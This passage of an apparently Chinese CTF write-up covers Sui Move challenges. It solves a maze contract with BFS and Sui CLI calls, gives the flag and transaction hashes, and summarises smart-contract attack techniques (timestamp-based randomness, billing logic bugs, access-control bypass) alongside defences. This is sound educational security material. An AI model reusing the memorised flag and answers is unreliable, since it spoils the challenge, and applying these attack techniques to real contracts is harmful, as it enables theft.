<li>通过事件机制验证解题结果</li>
</ul>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这道题目巧妙地结合了：</p>
<ul>
<li><strong>密码学</strong>: 基于格理论的加密方案</li>
<li><strong>数学</strong>: 线性代数和最近向量问题</li>
<li><strong>区块链</strong>: Sui Move智能合约技术</li>
</ul>
<p>解题的关键在于理解LWE类型的加密方案，并使用适当的格理论算法（CVP）来恢复明文。</p>
<hr>
<h1 id="4-迷宫游戏"><a href="#4-迷宫游戏" class="headerlink" title="4. 迷宫游戏"></a>4. 迷宫游戏</h1><h2 id="题目信息-2"><a href="#题目信息-2" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
<li><strong>题目名称</strong>: 迷宫游戏</li>
<li><strong>题目描述</strong>: 这是一道ctf题目 这里有一个迷宫游戏，你能顺利走出这个迷宫吗</li>
<li><strong>Package ID</strong>: <code>0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20</code></li>
<li><strong>部署交易哈希</strong>: <code>AgCw1ZGx5GFHFJHFTgdqjaVqY2zLrMbSgtevJz29K6yz</code></li>
<li><strong>区块链</strong>: Sui Network</li>
<li><strong>语言</strong>: Move</li>
</ul>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="1-合约结构分析"><a href="#1-合约结构分析" class="headerlink" title="1. 合约结构分析"></a>1. 合约结构分析</h3><p>通过查看Move合约源码，发现这是一个基于Sui区块链的迷宫游戏：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">const</span> <span class="token constant">ROW</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">COL</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">MAZE</span><span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token string">b"#S########\n#**#######\n##*#######\n##***#####\n####*#####\n##***###E#\n##*#####*#\n##*#####*#\n##*******#\n##########"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">START_POS</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-迷宫布局"><a href="#2-迷宫布局" class="headerlink" title="2. 迷宫布局"></a>2. 迷宫布局</h3><p>迷宫是一个10行11列的网格：</p>
<pre class="line-numbers language-none"><code class="language-none">#S########
#**#######
##*#######
##***#####
####*#####
##***###E#
##*#####*#
##*#####*#
##*******#
##########<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><code>#</code>: 墙壁</li>
<li><code>S</code>: 起点 (位置1)</li>
<li><code>E</code>: 终点 (位置63)</li>
<li><code>*</code>: 可通行路径</li>
</ul>
<h3 id="3-游戏机制"><a href="#3-游戏机制" class="headerlink" title="3. 游戏机制"></a>3. 游戏机制</h3><p>合约提供三个主要函数：</p>
<ol>
<li><strong>create_challenge()</strong>: 创建挑战，生成ChallengeStatus对象</li>
<li><strong>complete_challenge()</strong>: 完成迷宫，需要提供正确的移动序列</li>
<li><strong>claim_flag()</strong>: 获取flag，需要挑战完成后调用</li>
</ol>
<p>移动控制：</p>
<ul>
<li><code>w</code> (ASCII 119): 向上移动</li>
<li><code>s</code> (ASCII 115): 向下移动</li>
<li><code>a</code> (ASCII 97): 向左移动</li>
<li><code>d</code> (ASCII 100): 向右移动</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="步骤1-迷宫路径分析"><a href="#步骤1-迷宫路径分析" class="headerlink" title="步骤1: 迷宫路径分析"></a>步骤1: 迷宫路径分析</h3><p>使用BFS算法分析迷宫，找到从起点S到终点E的最短路径。</p>
<p>位置编号系统：</p>
<ul>
<li>位置 &#x3D; 行 × 11 + 列</li>
<li>起点S在位置1 (第0行第1列)</li>
<li>终点E在位置63 (第5行第8列)</li>
</ul>
<h3 id="步骤2-路径搜索算法"><a href="#步骤2-路径搜索算法" class="headerlink" title="步骤2: 路径搜索算法"></a>步骤2: 路径搜索算法</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> collections <span class="token keyword">import</span> deque

    start_pos <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># S的位置</span>
    end_pos <span class="token operator">=</span> <span class="token number">63</span>   <span class="token comment"># E的位置</span>

    queue <span class="token operator">=</span> deque<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>start_pos<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    visited <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span>start_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> queue<span class="token punctuation">:</span>
        current_pos<span class="token punctuation">,</span> path <span class="token operator">=</span> queue<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> current_pos <span class="token operator">==</span> end_pos<span class="token punctuation">:</span>
            <span class="token keyword">return</span> path

        <span class="token comment"># 尝试四个方向的移动</span>
        moves <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 上</span>
            <span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment"># 下</span>
            <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token comment"># 左</span>
            <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment"># 右</span>
        <span class="token punctuation">]</span>

        <span class="token keyword">for</span> move_char<span class="token punctuation">,</span> delta <span class="token keyword">in</span> moves<span class="token punctuation">:</span>
            new_pos <span class="token operator">=</span> current_pos <span class="token operator">+</span> delta
            <span class="token comment"># 边界检查和墙壁检查</span>
            <span class="token comment"># ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="步骤3-找到解决方案"><a href="#步骤3-找到解决方案" class="headerlink" title="步骤3: 找到解决方案"></a>步骤3: 找到解决方案</h3><p>通过BFS搜索，找到最短路径：<strong><code>sdssddssaasssddddddwww</code></strong></p>
<p>路径验证：</p>
<ol>
<li>S(1) → s → 12(<em>) → d → 13(</em>) → s → 24(<em>) → s → 35(</em>)</li>
<li>35(<em>) → d → 36(</em>) → d → 37(<em>) → s → 48(</em>) → s → 59(*)</li>
<li>59(<em>) → a → 58(</em>) → a → 57(<em>) → s → 68(</em>) → s → 79(*)</li>
<li>79(<em>) → s → 90(</em>) → d → 91(<em>) → d → 92(</em>) → d → 93(*)</li>
<li>93(<em>) → d → 94(</em>) → d → 95(<em>) → d → 96(</em>) → w → 85(*)</li>
<li>85(<em>) → w → 74(</em>) → w → 63(E) ✅</li>
</ol>
<h2 id="链上执行"><a href="#链上执行" class="headerlink" title="链上执行"></a>链上执行</h2><h3 id="步骤1-创建挑战"><a href="#步骤1-创建挑战" class="headerlink" title="步骤1: 创建挑战"></a>步骤1: 创建挑战</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>
  <span class="token parameter variable">--package</span> 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 <span class="token punctuation">\</span>
  <span class="token parameter variable">--module</span> maze <span class="token punctuation">\</span>
  <span class="token parameter variable">--function</span> create_challenge <span class="token punctuation">\</span>
  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>结果</strong>:</p>
<ul>
<li>Transaction Digest: <code>BUYeRta41EpQuNTFC41Rj1HYP3m1kfXSGffqgiNGCE5Z</code></li>
<li>Challenge Object ID: <code>0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55</code></li>
</ul>
<h3 id="步骤2-完成迷宫挑战"><a href="#步骤2-完成迷宫挑战" class="headerlink" title="步骤2: 完成迷宫挑战"></a>步骤2: 完成迷宫挑战</h3><p>将路径字符串转换为字节数组：</p>
<ul>
<li><code>sdssddssaasssddddddwww</code> → <code>[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]</code></li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>
  <span class="token parameter variable">--package</span> 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 <span class="token punctuation">\</span>
  <span class="token parameter variable">--module</span> maze <span class="token punctuation">\</span>
  <span class="token parameter variable">--function</span> complete_challenge <span class="token punctuation">\</span>
  <span class="token parameter variable">--args</span> 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 <span class="token string">'[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]'</span> <span class="token punctuation">\</span>
  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>结果</strong>:</p>
<ul>
<li>Transaction Digest: <code>FfbrP2KJemjqbmHJLpCQtthNTnEz7Fs1H6Emop4amqtx</code></li>
<li>触发Success事件，路径验证成功</li>
</ul>
<h3 id="步骤3-获取Flag"><a href="#步骤3-获取Flag" class="headerlink" title="步骤3: 获取Flag"></a>步骤3: 获取Flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token punctuation">\</span>
  <span class="token parameter variable">--package</span> 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 <span class="token punctuation">\</span>
  <span class="token parameter variable">--module</span> maze <span class="token punctuation">\</span>
  <span class="token parameter variable">--function</span> claim_flag <span class="token punctuation">\</span>
  <span class="token parameter variable">--args</span> 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 <span class="token punctuation">\</span>
  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>结果</strong>:</p>
<ul>
<li><strong>Transaction Digest</strong>: <code>6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ</code></li>
<li>触发FlagEvent事件，success: true</li>
</ul>
<h2 id="关键技术点-1"><a href="#关键技术点-1" class="headerlink" title="关键技术点"></a>关键技术点</h2><h3 id="1-Move合约分析"><a href="#1-Move合约分析" class="headerlink" title="1. Move合约分析"></a>1. Move合约分析</h3><ul>
<li>理解Sui Move语法和结构</li>
<li>分析entry函数的参数要求</li>
<li>理解事件机制</li>
</ul>
<h3 id="2-算法应用"><a href="#2-算法应用" class="headerlink" title="2. 算法应用"></a>2. 算法应用</h3><ul>
<li>BFS最短路径搜索</li>
<li>二维网格坐标转换</li>
<li>边界条件处理</li>
</ul>
<h3 id="3-区块链交互"><a href="#3-区块链交互" class="headerlink" title="3. 区块链交互"></a>3. 区块链交互</h3><ul>
<li>Sui CLI工具使用</li>
<li>交易参数格式化</li>
<li>对象ID管理</li>
</ul>
<h3 id="4-数据转换"><a href="#4-数据转换" class="headerlink" title="4. 数据转换"></a>4. 数据转换</h3><ul>
<li>字符串到字节数组转换</li>
<li>ASCII码映射</li>
<li>Move类型系统理解</li>
</ul>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这道题目考查了：</p>
<ol>
<li><strong>Move智能合约分析能力</strong></li>
<li><strong>图论算法应用</strong> (BFS路径搜索)</li>
<li><strong>区块链工具使用</strong> (Sui CLI)</li>
<li><strong>数据格式转换</strong> (字符串→字节数组)</li>
</ol>
<p><strong>最终答案</strong>: <code>6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ</code></p>
<p><strong>Flag</strong>: <code>CTF&#123;Letsmovectf&#125;</code></p>
<h2 id="工具和脚本"><a href="#工具和脚本" class="headerlink" title="工具和脚本"></a>工具和脚本</h2><p>解题过程中使用的Python脚本可以帮助：</p>
<ul>
<li>迷宫可视化和路径搜索</li>
<li>字节数组格式转换</li>
<li>自动化区块链交互</li>
</ul>
<hr>
<h1 id="综合技术总结"><a href="#综合技术总结" class="headerlink" title="综合技术总结"></a>综合技术总结</h1><h2 id="核心技能矩阵"><a href="#核心技能矩阵" class="headerlink" title="核心技能矩阵"></a>核心技能矩阵</h2><h3 id="1-Move智能合约分析"><a href="#1-Move智能合约分析" class="headerlink" title="1. Move智能合约分析"></a>1. Move智能合约分析</h3><ul>
<li><strong>语法理解</strong>: 掌握Sui Move的基本语法和类型系统</li>
<li><strong>漏洞识别</strong>: 能够发现注释代码、计费错误等常见漏洞</li>
<li><strong>对象模型</strong>: 理解Sui的对象所有权和转移机制</li>
<li><strong>事件系统</strong>: 掌握事件的触发和监听机制</li>
</ul>
<h3 id="2-算法与数据结构"><a href="#2-算法与数据结构" class="headerlink" title="2. 算法与数据结构"></a>2. 算法与数据结构</h3><ul>
<li><strong>动态规划</strong>: 房屋强盗问题的经典DP解法及其变种</li>
<li><strong>图论算法</strong>: BFS在路径搜索中的应用</li>
<li><strong>格理论</strong>: CVP问题和LLL算法的实际应用</li>
<li><strong>时间复杂度</strong>: 算法效率分析和优化</li>
</ul>
<h3 id="3-密码学知识"><a href="#3-密码学知识" class="headerlink" title="3. 密码学知识"></a>3. 密码学知识</h3><ul>
<li><strong>LWE问题</strong>: Learning With Errors加密方案的原理</li>
<li><strong>格基约化</strong>: LLL算法和Babai算法的实现</li>
<li><strong>最近向量问题</strong>: CVP的数学背景和解决方法</li>
<li><strong>哈希函数</strong>: Blake2b等密码学哈希的应用</li>
</ul>
<h3 id="4-区块链技术"><a href="#4-区块链技术" class="headerlink" title="4. 区块链技术"></a>4. 区块链技术</h3><ul>
<li><strong>Sui CLI</strong>: 命令行工具的熟练使用</li>
<li><strong>PTB机制</strong>: Programmable Transaction Block的构造和执行</li>
<li><strong>时间戳攻击</strong>: 利用区块链时间戳特性的攻击方法</li>
<li><strong>Gas优化</strong>: 交易费用的估算和优化</li>
</ul>
<h2 id="攻击技术分类"><a href="#攻击技术分类" class="headerlink" title="攻击技术分类"></a>攻击技术分类</h2><h3 id="1-智能合约漏洞利用"><a href="#1-智能合约漏洞利用" class="headerlink" title="1. 智能合约漏洞利用"></a>1. 智能合约漏洞利用</h3><ul>
<li><strong>代码审计</strong>: 发现被注释的关键代码</li>
<li><strong>逻辑错误</strong>: 利用计费不一致等业务逻辑漏洞</li>
<li><strong>状态管理</strong>: 利用状态更新的时序问题</li>
<li><strong>权限控制</strong>: 绕过访问控制机制</li>
</ul>
<h3 id="2-时间相关攻击"><a href="#2-时间相关攻击" class="headerlink" title="2. 时间相关攻击"></a>2. 时间相关攻击</h3><ul>
<li><strong>时间戳依赖</strong>: 利用可预测的时间戳生成随机数</li>
<li><strong>PTB同步</strong>: 确保批量操作使用相同时间戳</li>
<li><strong>时序攻击</strong>: 利用操作执行的时间差</li>
</ul>
<h3 id="3-数学攻击"><a href="#3-数学攻击" class="headerlink" title="3. 数学攻击"></a>3. 数学攻击</h3><ul>
<li><strong>算法逆向</strong>: 通过分析算法找到逆向求解方法</li>
<li><strong>概率分析</strong>: 计算攻击成功的概率并优化策略</li>
<li><strong>密码学攻击</strong>: 使用高级数学工具破解加密方案</li>
</ul>
<h3 id="4-自动化攻击"><a href="#4-自动化攻击" class="headerlink" title="4. 自动化攻击"></a>4. 自动化攻击</h3><ul>
<li><strong>脚本编写</strong>: 开发自动化攻击脚本</li>
<li><strong>批量操作</strong>: 通过PTB执行大量重复操作</li>
<li><strong>条件触发</strong>: 等待有利条件自动执行攻击</li>
</ul>
<h2 id="防御策略建议"><a href="#防御策略建议" class="headerlink" title="防御策略建议"></a>防御策略建议</h2><h3 id="1-代码安全"><a href="#1-代码安全" class="headerlink" title="1. 代码安全"></a>1. 代码安全</h3><ul>
<li><strong>完整性检查</strong>: 确保所有必要的代码都被执行</li>
<li><strong>逻辑一致性</strong>: 检查和扣费逻辑必须保持一致</li>
<li><strong>边界验证</strong>: 严格验证所有输入参数的边界条件</li>
<li><strong>状态同步</strong>: 确保状态更新的原子性</li>
</ul>
<h3 id="2-随机数安全"><a href="#2-随机数安全" class="headerlink" title="2. 随机数安全"></a>2. 随机数安全</h3><ul>
<li><strong>真随机源</strong>: 使用密码学安全的随机数生成器</li>
<li><strong>时间戳避免</strong>: 不要依赖可预测的时间戳</li>
<li><strong>熵源多样化</strong>: 结合多个熵源生成随机数</li>
<li><strong>随机性测试</strong>: 定期测试随机数的质量</li>
</ul>
<h3 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3. 访问控制"></a>3. 访问控制</h3><ul>
<li><strong>权限最小化</strong>: 只授予必要的最小权限</li>
<li><strong>多重验证</strong>: 关键操作需要多重验证</li>
<li><strong>时间锁</strong>: 对重要操作添加时间延迟</li>
<li><strong>频率限制</strong>: 限制高频操作的执行</li>
</ul>
<h3 id="4-监控和审计"><a href="#4-监控和审计" class="headerlink" title="4. 监控和审计"></a>4. 监控和审计</h3><ul>
<li><strong>事件监控</strong>: 实时监控异常事件和模式</li>
<li><strong>交易分析</strong>: 分析可疑的交易模式</li>
<li><strong>代码审计</strong>: 定期进行专业的代码安全审计</li>
<li><strong>渗透测试</strong>: 定期进行安全渗透测试</li>
</ul>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这四道Sui Move CTF题目展示了区块链安全的多个重要方面：</p>
<ol>
<li><strong>技术深度</strong>: 从基础的路径搜索到高级的格理论密码学</li>
<li><strong>攻击复杂性</strong>: 从单一漏洞利用到多漏洞组合攻击</li>
<li><strong>工具多样性</strong>: 从简单的CLI工具到复杂的数学软件</li>
<li><strong>思维方式</strong>: 从逆向分析到正向构造的完整思维链</li>
</ol>
<p>通过系统性的分析和攻击，我们不仅获得了所有Flag，更重要的是：</p>
<ul>
<li>深入理解了Move智能合约的安全特性</li>
<li>掌握了多种攻击技术和防御策略</li>
<li>提高了综合的安全分析和解决问题的能力</li>
<li>建立了完整的区块链安全知识体系</li>
</ul>
<p>这些技能和经验对于区块链安全研究、智能合约审计、以及Web3安全防护都具有重要的实践价值。随着区块链技术的不断发展，这类综合性的安全挑战将变得越来越重要，需要我们持续学习和实践。</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/04/28/How%20To%20Define%20a%20Referenced%20Sound/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2025-08-05 16:32:21
            </span>
            
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sui-Move-CTF-2025-1-4-WriteUp"><span class="toc-text">Sui Move CTF 2025(1-4) WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%86%92%E9%99%A9%E6%B8%B8%E6%88%8F"><span class="toc-text">1. 冒险游戏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%91%E6%88%98%E6%A6%82%E8%BF%B0"><span class="toc-text">挑战概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90"><span class="toc-text">合约分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84"><span class="toc-text">核心合约结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-text">关键漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%93%E5%8A%9B%E6%B6%88%E8%80%97%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 体力消耗漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E6%88%B3%E4%BE%9D%E8%B5%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. 时间戳依赖漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%A1%E8%B4%B9%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. 计费错误漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5"><span class="toc-text">攻击策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B51-%E8%8B%B1%E9%9B%84%E6%88%98%E6%96%97%E5%8A%9B%E6%8F%90%E5%8D%87"><span class="toc-text">阶段1: 英雄战斗力提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B52-PTB%E6%97%B6%E9%97%B4%E6%88%B3%E6%94%BB%E5%87%BB"><span class="toc-text">阶段2: PTB时间戳攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B53-%E8%B4%AD%E4%B9%B0%E5%AE%9D%E7%AE%B1%E8%8E%B7%E5%8F%96Flag"><span class="toc-text">阶段3: 购买宝箱获取Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-text">攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%B1%E9%9B%84%E5%8D%87%E7%BA%A7%E8%84%9A%E6%9C%AC"><span class="toc-text">英雄升级脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTB%E6%89%B9%E9%87%8F%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-text">PTB批量攻击脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="toc-text">攻击执行过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">1. 环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8B%B1%E9%9B%84%E5%8D%87%E7%BA%A7"><span class="toc-text">2. 英雄升级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PTB%E6%94%BB%E5%87%BB"><span class="toc-text">3. PTB攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96Flag"><span class="toc-text">4. 获取Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C"><span class="toc-text">攻击结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-text">技术要点总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-text">防御建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><span class="toc-text">详细技术分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%88%B3%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">时间戳攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTB%E6%9E%84%E9%80%A0%E6%8A%80%E5%B7%A7"><span class="toc-text">PTB构造技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8B%B1%E9%9B%84%E5%8D%87%E7%BA%A7%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90"><span class="toc-text">英雄升级数值分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-text">攻击时间线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5"><span class="toc-text">关键代码片段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%811-%E4%BD%93%E5%8A%9B%E6%B6%88%E8%80%97%E8%A2%AB%E6%B3%A8%E9%87%8A"><span class="toc-text">漏洞代码1: 体力消耗被注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%812-%E6%97%B6%E9%97%B4%E6%88%B3%E4%BE%9D%E8%B5%96"><span class="toc-text">漏洞代码2: 时间戳依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%813-%E8%AE%A1%E8%B4%B9%E9%94%99%E8%AF%AF"><span class="toc-text">漏洞代码3: 计费错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-text">完整攻击脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9"><span class="toc-text">学习要点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90"><span class="toc-text">相关资源</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%BC%BA%E7%9B%97%E6%B8%B8%E6%88%8F"><span class="toc-text">2. 强盗游戏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90"><span class="toc-text">1. 合约分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AE%97%E6%B3%95%E7%90%86%E8%A7%A3"><span class="toc-text">2. 算法理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC"><span class="toc-text">3. 解题脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-text">解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B8%B8%E6%88%8F"><span class="toc-text">1. 初始化游戏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8BChallenge%E5%AF%B9%E8%B1%A1"><span class="toc-text">2. 查看Challenge对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 